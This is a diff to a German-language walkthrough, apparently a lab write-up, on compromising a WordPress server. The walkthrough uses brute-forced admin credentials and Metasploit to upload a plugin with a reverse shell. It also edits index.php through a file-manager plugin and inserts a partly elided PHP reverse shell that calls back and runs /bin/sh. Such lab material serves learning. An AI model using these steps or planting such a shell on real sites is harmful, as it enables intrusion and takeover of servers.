@@ -115,7 +115,9 @@ Jetzt haben wir das Credentials für den Adminaccount: **wp_user:cisco123**
 ### 2.2 Mit msf Wordpress scanen
 
 (Braucht man nicht machen, wenn man den scan von vorher gemacht hat)
-Da wir jetzt den Scan/Bruteforce attacke auf den Server ausgeführt haben, haben wir ja die Credentials des Kontos bekommen. Jetzt kann man mit metasploit einen exploit starten: 
+Da wir jetzt den Scan/Bruteforce attacke auf den Server ausgeführt haben, haben wir ja die Credentials des Kontos bekommen. Jetzt kann man mit metasploit einen exploit starten! 
+
+Mit diesem Modul von Metasploit ladet man ein maliziöses Plugin auf den Server, welches eine reverse shell payload beinhaltet. 
 
 ```
 use auxiliary/scanner/http/wordpress_login_enum
@@ -127,7 +129,6 @@ exploit
 ```
 
 ![image](./IMAGES/wp_msf_1.png)
-
 
 ### 2.3 Mit einer Reverse Shell den Server exploiten
 
@@ -146,5 +147,32 @@ exploit
 
 ![image](./IMAGES/wp_exploit_rshell.png)
 
+Als nächstes kann man ja, da man die Credentials eines Admins hat, auf dem Management-panel im Browser das Plug-in "Advanced File Manager" installieren und dadurch die Konfig des index.php files bearbeiten und schadhaften Code einfügen. 
 
+Da es das Plugin nicht gibt welches im Guide verwendet wurde, habe ich das File Manager Plug-in verwendet. 
 
+![image](./IMAGES/WP_Plugin.png)
+
+Anschließend muss das Plugin, dann aktiviert werden. 
+
+Wenn man das Plug-in jetzt aktiviert hat kann man im Management-panel die Dateien des Wordpress Servers bearbeiten. Wir wollen das index.php file verändern welches unter html ist. 
+
+![image](./IMAGES/WP_Files.png)
+
+Um jetzt das File zu verändern ums man auf das zuverändernde File rechtsklick drücken und dann kann man auf edit File -> Text area, das File ändern. 
+
+Um eine reverse shell verbindung herzustellen wollen wir diesen code in die index.php seite einfügen
+```
+[...]
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '127.0.0.1';  // CHANGE THIS
+$port = 8080;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+[...]
+```
